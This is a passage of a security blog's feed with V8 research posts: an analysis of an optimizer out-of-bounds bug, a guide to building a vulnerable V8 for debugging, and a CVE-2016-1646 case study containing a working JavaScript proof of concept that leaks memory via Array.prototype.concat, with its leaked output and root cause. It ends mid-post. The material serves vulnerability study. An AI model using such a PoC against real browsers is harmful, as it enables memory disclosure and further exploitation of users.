class="line">0x35680eb86a95  code target (CALL_IC)  (0x35680eb84840)</span><br><span class="line">0x35680eb86aa7  embedded object  (0x3700be62c4c9 Cell for 6144)</span><br><span class="line">0x35680eb86ab7  code target (BUILTIN)  (0x35680eae2860)</span><br><span class="line">0x35680eb86abe  embedded object  (0x3700be62c4c9 Cell for 6144)</span><br><span class="line"></span><br><span class="line">--- End code ---</span><br></pre></td></tr></table></figure><h4 id="优化后-1"><a href="#优化后-1" class="headerlink" title="优化后"></a>优化后</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz = 0x826852f4;</span><br><span class="line">parseInt(&apos;AAAAAAAA&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Optimized code ---</span><br><span class="line">optimization_id = 1</span><br><span class="line">source_position = 50</span><br><span class="line">kind = OPTIMIZED_FUNCTION</span><br><span class="line">name = Check</span><br><span class="line">stack_slots = 5</span><br><span class="line">compiler = crankshaft</span><br><span class="line">Instructions (size = 186)</span><br><span class="line">0x35680eb86c80     0  55             push rbp</span><br><span class="line">0x35680eb86c81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86c84     4  56             push rsi</span><br><span class="line">0x35680eb86c85     5  57             push rdi</span><br><span class="line">0x35680eb86c86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x35680eb86c8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x35680eb86c8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x35680eb86c92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x35680eb86c95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86c9c    28  7305           jnc 35  (0x35680eb86ca3)</span><br><span class="line">0x35680eb86c9e    30  e83dbcf5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86ca3    35  48b8c1bd62be00370000 REX.W movq rax,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b675545e1 &lt;a Set with map 0xae15ff0c391&gt;</span><br><span class="line">0x35680eb86cad    45  488b400f       REX.W movq rax,[rax+0xf]</span><br><span class="line">0x35680eb86cb1    49  49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000</span><br><span class="line">0x35680eb86cbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">0x35680eb86cc0    64  488b4007       REX.W movq rax,[rax+0x7]</span><br><span class="line">0x35680eb86cc4    68  488b400f       REX.W movq rax,[rax+0xf]</span><br><span class="line">0x35680eb86cc8    72  c5fb114007     vmovsd [rax+0x7],xmm0</span><br><span class="line">0x35680eb86ccd    77  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86cd7    87  4152           push r10</span><br><span class="line">0x35680eb86cd9    89  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86ce3    99  4152           push r10</span><br><span class="line">0x35680eb86ce5   101  48bf51d860be00370000 REX.W movq rdi,0x3700be60d851    ;; object: 0x3700be60d851 &lt;JS Function parseInt (SharedFunctionInfo 0xf6ab33ce11)&gt;</span><br><span class="line">0x35680eb86cef   111  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="line">0x35680eb86cf3   115  488b7727       REX.W movq rsi,[rdi+0x27]</span><br><span class="line">0x35680eb86cf7   119  498b55a0       REX.W movq rdx,[r13-0x60]</span><br><span class="line">0x35680eb86cfb   123  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86d00   128  bb02000000     movl rbx,0x2</span><br><span class="line">0x35680eb86d05   133  e8f6eeefff     call ArgumentsAdaptorTrampoline  (0x35680ea85c00)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86d0a   138  48b8112330abf6000000 REX.W movq rax,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86d14   148  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x35680eb86d17   151  5d             pop rbp</span><br><span class="line">0x35680eb86d18   152  c20800         ret 0x8</span><br><span class="line">0x35680eb86d1b   155  90             nop</span><br></pre></td></tr></table></figure><h4 id="强调-1"><a href="#强调-1" class="headerlink" title="强调"></a>强调</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x35680eb86ca3    35  48b8c1bd62be00370000 REX.W movq rax,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b675545e1 &lt;a Set with map 0xae15ff0c391&gt;</span><br><span class="line">0x35680eb86cad    45  488b400f       REX.W movq rax,[rax+0xf]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x35680eb86cb1    49  49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000</span><br><span class="line">0x35680eb86cbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">0x35680eb86cc0    64  488b4007       REX.W movq rax,[rax+0x7]</span><br><span class="line">0x35680eb86cc4    68  488b400f       REX.W movq rax,[rax+0xf]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x35680eb86cc8    72  c5fb114007     vmovsd [rax+0x7],xmm0</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-27-123307.png" alt=""><br>optimized code假设object已经有property,然而如果object被改变为没有property，就会OOB。<br>如图</p><ul><li>寻址jsset map<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq rax,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell</span><br><span class="line">mov rax,[rax+0xf]</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-27-124411.png" alt=""></p><ul><li>寻址property<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax [rax+0x7]</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-27-124507.png" alt=""></p><ul><li>寻址到相邻null string的map<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movq rax,[rax+0xf]</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-27-124631.png" alt=""></p><ul><li>oob覆盖type,造成confused<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-27-124908.png" alt=""><h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2>todo<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2>todo<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2></li><li>vmovsd<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-26-074503.png" alt=""></li><li>xmm<br>在 x86-64 中,XMM寄存器用来向函数传递浮点参数及浮点型返回值.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-26-080258.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-26-080340.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;bugs&quot;&gt;&lt;a href=&quot;#bugs&quot; class=&quot;headerlink&quot; title=&quot;bugs&quot;&gt;&lt;/a&gt;bugs&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8调试环境搭建(解决遇到的一些问题)</title>
    <link href="http://eternalsakura13.com/2018/06/26/v8_environment/"/>
    <id>http://eternalsakura13.com/2018/06/26/v8_environment/</id>
    <published>2018-06-25T19:54:15.180Z</published>
    <updated>2018-06-27T03:08:39.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这个是因为之前一直没有一个特别好的v8调试环境搭建的方法。<br>最主要的原因就是墙,然后花了一晚上摸索了一个感觉还行的解决方案吧。。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><a href="https://cloud.google.com/" target="_blank" rel="noopener">谷歌云</a>的centos 7 x64<br>地区选台湾，4核机器就行。<br>其他国外云主机应该也行。。不过谷歌云用完了删除实例就好，很方便。</p><h2 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">中途中断了就gclient sync</span><br></pre></td></tr></table></figure><h2 id="切换到有漏洞的分支"><a href="#切换到有漏洞的分支" class="headerlink" title="切换到有漏洞的分支"></a>切换到有漏洞的分支</h2><p>举例来说</p><ul><li>bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a></li><li><p>fix commit<br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p></li><li><p>找到hash和test代码<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-25-201821.png" alt=""></p></li><li>切换<br><code>cd ~/v8/v8</code><br><code>git reset --hard a7a350012c05f644f3f373fb48d7ac72f7f60542</code></li><li><p>同步并编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure></li><li><p>测试<br>用test里的代码测试一下效果，省略。</p></li></ul><h2 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h2><p>打包编译好的v8目录，<code>tar -czvf v8.tar v8</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install vsftpd -y</span><br><span class="line">service vsftpd start</span><br><span class="line">netstat -nltp | grep 21</span><br></pre></td></tr></table></figure></p><p>此时，访问 ftp://<ip 地址=""> 可浏览机器上的/var/ftp目录了。<br>把源码cp到这个目录下，直接下载即可了。</ip></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>然后删除原来的，对tar进行解包，得到我们要调试的v8<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-25-203426.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-25-203519.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-25-203545.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;写这个是因为之前一直没有一个特别好的v8调试环境搭建的方法。&lt;br&gt;最主要的原因就是墙,然后花了一晚上摸索了一个感觉还行的解决方案吧。。&lt;/
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Case	study CVE-2016-1646</title>
    <link href="http://eternalsakura13.com/2018/06/23/CVE-2016-1646/"/>
    <id>http://eternalsakura13.com/2018/06/23/CVE-2016-1646/</id>
    <published>2018-06-23T06:43:39.561Z</published>
    <updated>2018-06-23T09:23:00.576Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bugs"><a href="#Bugs" class="headerlink" title="Bugs"></a>Bugs</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=594574" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=594574</a></p><p>Array.prototype.concat did not work correct with complex elements on the<br>receiver or the prototype chain.</p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://chromium.googlesource.com/v8/v8/+/96a2bd8ae8c25e2acbe63319011cbb829b59e3df" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/96a2bd8ae8c25e2acbe63319011cbb829b59e3df</a><br>[builtins] Fix Array.prototype.concat bug</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function gc() &#123;</span></span><br><span class="line"><span class="undefined">  tmp = [];</span></span><br><span class="line"><span class="undefined">  for (var i = 0; i &lt; 0x100000; i++)</span></span><br><span class="line"><span class="undefined">    tmp.push(new Uint8Array(10));</span></span><br><span class="line"><span class="undefined">  tmp = null;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">b = new Array(10);</span></span><br><span class="line"><span class="undefined">b[0] = 0.1; &lt;-- Note that b[1] is a hole!</span></span><br><span class="line"><span class="undefined">b[2] = 2.1;</span></span><br><span class="line"><span class="undefined">b[3] = 3.1;</span></span><br><span class="line"><span class="undefined">b[4] = 4.1;</span></span><br><span class="line"><span class="undefined">b[5] = 5.1;</span></span><br><span class="line"><span class="undefined">b[6] = 6.1;</span></span><br><span class="line"><span class="undefined">b[7] = 7.1;</span></span><br><span class="line"><span class="undefined">b[8] = 8.1;</span></span><br><span class="line"><span class="undefined">b[9] = 9.1;</span></span><br><span class="line"><span class="undefined">b[10] = 10.1;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">Object.defineProperty(b.__proto__, 1, &#123; &lt;-- define b.__proto__[1] to gain the control in the middle of the loop</span></span><br><span class="line"><span class="undefined">get: function () &#123;</span></span><br><span class="line"><span class="undefined">b.length = 1; &lt;-- shorten the array</span></span><br><span class="line"><span class="undefined">gc(); &lt;-- shrink the memory</span></span><br><span class="line"><span class="undefined">return 1;</span></span><br><span class="line"><span class="undefined">&#125;,</span></span><br><span class="line"><span class="undefined">set: function(new_value)&#123;</span></span><br><span class="line"><span class="undefined">        /* some business logic goes here */</span></span><br><span class="line"><span class="undefined">        value = new_value</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">c = b.concat();</span></span><br><span class="line"><span class="undefined">for (var i = 0; i &lt; c.length; i++)</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="undefined">    document.write(c[i]);</span></span><br><span class="line"><span class="xml">    document.write("<span class="tag">&lt;<span class="name">br</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>leak info<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">my result (it differs):</span><br><span class="line">0.1</span><br><span class="line">1</span><br><span class="line">3.60739284464e-313</span><br><span class="line">2.121995791e-314</span><br><span class="line">0</span><br><span class="line">8.487983164e-314</span><br><span class="line">2.121995791e-314</span><br><span class="line">2.121995791e-314</span><br><span class="line">2.121995791e-314</span><br><span class="line">1.9338903543223e-311</span><br><span class="line">2.610054822887e-312</span><br></pre></td></tr></table></figure></p><h2 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h2><p>vulnerability IterateElements (src/builtin.cc:997)，用于迭代访问array<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">From line <span class="number">1025</span> in src/builtin.cc (function IterateElements):</span><br><span class="line">  <span class="keyword">switch</span> (<span class="built_in">array</span>-&gt;GetElementsKind()) &#123;</span><br><span class="line">    <span class="keyword">case</span> FAST_SMI_ELEMENTS:</span><br><span class="line">    <span class="keyword">case</span> FAST_ELEMENTS:</span><br><span class="line">    <span class="keyword">case</span> FAST_HOLEY_SMI_ELEMENTS:</span><br><span class="line">    <span class="keyword">case</span> FAST_HOLEY_ELEMENTS: &#123;</span><br><span class="line">      <span class="comment">// Run through the elements FixedArray and use HasElement and GetElement</span></span><br><span class="line">      <span class="comment">// to check the prototype for missing elements.</span></span><br><span class="line">      Handle&lt;FixedArray&gt; elements(FixedArray::cast(<span class="built_in">array</span>-&gt;elements()));</span><br><span class="line">      <span class="keyword">int</span> fast_length = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(length);  &lt;-- fast_length keeps its value after entering the iteration below</span><br><span class="line">      DCHECK(fast_length &lt;= elements-&gt;length());</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; fast_length; j++) &#123;</span><br><span class="line">        <span class="function">HandleScope <span class="title">loop_scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">        Handle&lt;Object&gt; element_value(elements-&gt;get(j), isolate); &lt;-- <span class="function">get the element with index <span class="title">j</span> <span class="params">(leading to oob access)</span></span></span><br><span class="line">        if (!element_value-&gt;IsTheHole()) &#123;</span><br><span class="line">          visitor-&gt;visit(j, element_value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  &lt;-- <span class="keyword">if</span> it is a hole, it may go to its prototype <span class="keyword">for</span> the value with index j</span><br><span class="line">          Maybe&lt;<span class="keyword">bool</span>&gt; maybe = JSReceiver::HasElement(<span class="built_in">array</span>, j);</span><br><span class="line">          <span class="keyword">if</span> (!maybe.IsJust()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">if</span> (maybe.FromJust()) &#123;</span><br><span class="line">            <span class="comment">// Call GetElement on array, not its prototype, or getters won't</span></span><br><span class="line">            <span class="comment">// have the correct receiver.</span></span><br><span class="line">            ASSIGN_RETURN_ON_EXCEPTION_VALUE(</span><br><span class="line">                isolate, element_value, Object::GetElement(isolate, <span class="built_in">array</span>, j),</span><br><span class="line">                <span class="literal">false</span>);   &lt;-- here we redefine the function to get the value in <span class="built_in">array</span>'s __proto__ with index j</span><br><span class="line">                          &lt;-- <span class="function">inside our redefinition function we make the length of the <span class="built_in">array</span> <span class="title">shorter</span> <span class="params">(&lt; fast_length)</span></span></span><br><span class="line">            visitor-&gt;visit(j, element_value);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><ul><li><code>int fast_length = static_cast&lt;int&gt;(length);</code><br>fast_length缓存了array原本的length</li><li>用一个hole element占位，进入else分支，<strong>触发getters</strong>，在get里缩短array的length，并进行GC，移动array。<br>  <strong>array的length在回调中被缩小，内存分配被改变，但是在函数里依然按照缓存的长度（fast_length）即原来的length来访问array，于是就访问到了不属于array的内存，造成OOB</strong></li></ul><p>（其实直接看代码里写的&lt;–注释就好…)</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><ul><li><p><strong>TODO</strong><br>OOB控制ArrayBuffer实现任意地址读写。</p></li><li><p>参考链接<br><a href="https://github.com/4B5F5F4B/Exploits/tree/master/Chrome/CVE-2016-1646" target="_blank" rel="noopener">https://github.com/4B5F5F4B/Exploits/tree/master/Chrome/CVE-2016-1646</a></p></li></ul><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><p>检查是否有prototype或者receiver在elements里<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+<span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">HasOnlySimpleReceiverElements</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="function"><span class="params">+                                          JSReceiver* receiver)</span> </span>&#123;</span><br><span class="line">+  <span class="comment">// Check that we have no accessors on the receiver's elements.</span></span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">+<span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">HasOnlySimpleElements</span><span class="params">(Isolate* isolate, JSReceiver* receiver)</span> </span>&#123;</span><br><span class="line">+  <span class="comment">// Check that ther are not elements on the prototype.</span></span><br></pre></td></tr></table></figure></p><p>当有prototype或者receiver在elements里时，切换到slow case，原本的检查并不够严格。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-  <span class="keyword">if</span> (!receiver-&gt;IsJSArray()) &#123;</span><br><span class="line">-    <span class="comment">// For classes which are not known to be safe to access via elements alone,</span></span><br><span class="line">-    <span class="comment">// use the slow case.</span></span><br><span class="line">+  <span class="keyword">if</span> (!HasOnlySimpleElements(isolate, *receiver)) &#123;</span><br><span class="line">     <span class="keyword">return</span> IterateElementsSlow(isolate, receiver, length, visitor);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Bugs&quot;&gt;&lt;a href=&quot;#Bugs&quot; class=&quot;headerlink&quot; title=&quot;Bugs&quot;&gt;&lt;/a&gt;Bugs&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 debug writeup</title>
    <link href="http://eternalsakura13.com/2018/06/18/v81/"/>
    <id>http://eternalsakura13.com/2018/06/18/v81/</id>
    <published>2018-06-18T14:54:11.123Z</published>
    <updated>2018-06-23T19:00:03.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="v8-hidden-class-test"><a href="#v8-hidden-class-test" class="headerlink" title="v8 hidden class test"></a>v8 hidden class test</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Point(<span class="number">12</span>, <span class="number">13</span>);</span><br><span class="line">%DebugPrint(p2)</span><br></pre></td></tr></table></figure><p><code>./d8 --allow_natives_syntax test_hidden_class.js</code><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-14-131739.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x27984250c879: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 